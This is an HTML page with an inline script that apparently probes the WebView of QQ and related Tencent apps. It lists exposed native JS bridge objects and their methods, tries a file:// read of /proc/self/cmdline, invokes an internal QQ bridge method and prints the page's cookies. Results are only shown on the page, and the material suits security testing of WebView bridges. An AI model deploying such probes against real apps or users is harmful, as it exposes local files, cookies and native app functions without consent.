<!DOCTYPE html><html><head><meta charset="utf-8"><title>QQBRIDGEPROBE</title>
<style>body{background:#fff;color:#000;font:11px monospace;word-break:break-all;margin:4px;padding:0}</style>
</head><body><div id="out">== QQ BRIDGE PROBE ==</div>
<script>
function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;');}
function w(t){document.getElementById('out').innerHTML += '<br>' + esc(t);}
w('URL=' + location.href);
w('UA=' + navigator.userAgent.slice(0,80));

// 1) window 全量可疑属性
var keys = Object.getOwnPropertyNames(window);
var sus = [];
for (var i=0;i<keys.length;i++){var k=keys[i];
  if (/bridge|Bridge|jsApi|JsApi|mqq|qimei|webso|Weixin|hippy|dtB|tbs|qb|_mqq|Interface|jsbridge|native|Native|app/i.test(k)){
    try{sus.push(k+':'+typeof window[k]);}catch(e){}}}
w('SUS('+sus.length+'): '+sus.slice(0,40).join(' | '));

// 2) 已知 bridge
var known = ['_mqqWebViewJSInterface','_webso','qimeiBridge','dtBridge','DTJsBridgeInterface',
  'WeixinJSCore','QQJSCore','hippy','webbundle','docsPreview','docs','local_obj','ECommerceJSBridge',
  'appApi','jsApi','JsBridge','NativeApp','_AppInterface','TenvideoJSBridge','QQLiveJavaInterface'];
var hits=[];
for (var j=0;j<known.length;j++){try{if(window[known[j]]!==undefined){
  var meth=[];try{meth=Object.keys(window[known[j]]).slice(0,20);}catch(e){meth=['?'];}
  hits.push(known[j]+'('+meth.join(',')+')');}}catch(e){}}
w('HITS('+hits.length+'): '+(hits.join(' || ')||'NONE'));

// 3) _mqqWebViewJSInterface.invoke 探测
try{
  if(window._mqqWebViewJSInterface){
    w('MQQ_IFACE props: '+Object.getOwnPropertyNames(window._mqqWebViewJSInterface).join(','));
  }
}catch(e){w('MQQ_ERR:'+e.message);}

// 4) file:// 读探测
try{
  fetch('file:///proc/self/cmdline').then(function(r){return r.text();}).then(function(t){
    w('FILE_READ: '+t.slice(0,100));
  }).catch(function(e){w('FILE_ERR: '+e.message);});
}catch(e){w('FETCH_ERR:'+String(e));}

// 5) 尝试调 _mqqWebViewJSInterface.invoke 一个无害方法（getDeviceInfo 或类似）
try{
  if(window._mqqWebViewJSInterface && window._mqqWebViewJSInterface.invoke){
    // QQ 的 invoke 格式：JSON.stringify({method, types, args, from, pageSize})
    var msg = JSON.stringify({method:'publicAccount.isFollowUin',types:[],args:[],from:'qq',pageSize:1});
    var r = window._mqqWebViewJSInterface.invoke(msg);
    w('INVOKE_TEST: '+String(r).slice(0,200));
  }
}catch(e){w('INVOKE_ERR:'+e.message);}

// 6) Cookie 读取
try{w('COOKIE: '+document.cookie.slice(0,200));}catch(e){w('COOKIE_ERR:'+e.message);}
try{w('TITLE: '+document.title);}catch(e){}

setTimeout(function(){w('== DONE ==');},2000);
</script></body></html>
